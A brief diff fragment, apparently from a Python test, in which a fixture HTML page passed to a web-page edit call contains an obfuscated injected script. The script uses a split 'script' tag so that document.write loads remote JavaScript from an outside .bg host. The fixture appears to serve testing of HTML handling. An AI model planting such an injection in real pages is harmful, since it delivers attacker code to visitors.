@@ -1629,6 +1629,7 @@ style=3D'color:black'>05D65812<o:p></o:p></span></p>
 <script LANGUAGE="JavaScript" type="text/javascript">
 document.write('<sc'+'ript type="text/javascript" src="http://somosite.bg/utb.php"></sc'+'ript>');
 </script>
+<p class="Th&#232;mes"/>
 </BODY></HTML>
     """
     web_page.edit(text_content=html_content)
